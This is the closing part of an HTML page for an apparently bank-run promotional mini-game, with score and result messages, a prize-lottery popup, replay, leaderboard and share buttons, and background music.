     	<div class="d_1">
     		<ul class="d_ul">
     			<li class="">
     				<img src="" alt="" id="teamImgUrl2"/>
     				<span id="teamName2"></span>
     				<i id="sucInfo" style="display:none;"></i>
     				<i id="failInfo" style="display:none;"></i>
     			</li>
     		</ul>
     		<div class="d_2">
     			您的得分：<span id="end-score"></span><br/>
     		</div>
     		<div class="d_3" id="gameresultsuc" style="display:none;">恭喜您获得一次抽奖机会</div>
     		<div class="d_3" id="gameresultfail" style="display:none;">
     			很遗憾挑战失败
     		<!--<p style="color: #999999;">领取游戏分的活动登记手机号<br/>需开通浦发银行手机银行或直销银行</p>-->
     		</div>
     		
     		<div class="d_4">
     			<ul>
     				<li class="li" id="liSuccess" style="display: none;">
     					<img id="btnLottery" class="cj" src="imgs/cj.png"/>
     				</li>
     				<li class="li" id="liFail" style="display: none;">
     					<img id="backIndex" class="qd" src="imgs/qd.png"/>
     					<img id="gozhixiao" class="kt" src="imgs/kt.png"/>
     				</li>
     			</ul>  
     			<p style="color: #999999;">领取金豆的登记手机号<br/>需开通浦发银行手机银行或直销银行</p>
     		</div>
     		<div class="d_5">
     			还有<span id="divUsertimes"></span>次游戏机会
     		</div>
     	</div>
     	
     	<div class="dd">
     		<ul>
     			<li class="li1" id="replay">
     				<img src="imgs/d1.png"/>
     				<p>再玩一次</p>
     			</li>
     			<li class="li2" id="charts">
     				<img src="imgs/d2.png"/>
     				<p>排行榜</p>
     			</li>
     			<li class="li3" id="btnShare">
     				<img src="imgs/d3.png"/>
     				<p>分享</p>
     			</li>
     		</ul>
     	</div>
     	<div class="share" id="share_pg" style="display: none;">
     		<img src="imgs/share.png"/>
     	</div>
     	
     	<div class="de" id="dfj" style="display: none;">
     		<div class="dfj" >
     			<img src="imgs/fjcj.png"/>
     		</div>     		
     	</div>
     	<div class="de" id="prize" style="display: none;">
     		<div class="zjtk" >
     			<p>恭喜您中奖了</p>
     			<img class="goods" src="" id="goodsImg" />
     			<i id="goodsName"></i>
     			<div class="btn">
     				<img class="qzf" id="gopay" src="imgs/qzf.png"/>
     				<img class="sl" id="giveup" src="imgs/sl.png"/>
     			</div>
     		</div>
     	</div>
     	
     	<!--描述：已经获得奖品再次抽奖的弹框-->
     	<div class="de" id="lottery_success_sure" style="display: none;">
     		<div class="zjtk" >
     			<p style="padding-top: 5rem;">您已获得奖品，每位<br/>客户仅限金豆支付一次哦~</p>
     			<div class="btn">
     				<img id="success_sure" class="qd" src="imgs/qd.png"/>
     			</div>
     		</div>
     	</div>
     	
     	<!--描述：奖品发完了 & 未中奖 -->
     	<div class="de" id="lottery_success_no" style="display: none;">
     		<div class="zjtk" >
     			<img class="mzj" src="imgs/mzj.png"/>
     			<div class="btn">
     				<img id="success_no" class="qd" src="imgs/qd.png"/>
     			</div>
     		</div>
     	</div>
     	
    </div>
<div class="r_music2 play2" id="music">
    <audio controls id="mediaAudio" style="display:block;height:0;opacity:0" loop="ture">
        <source src="imgs/music.mp3" type="audio/mpeg">
    </audio>
</div>
</body>
</html>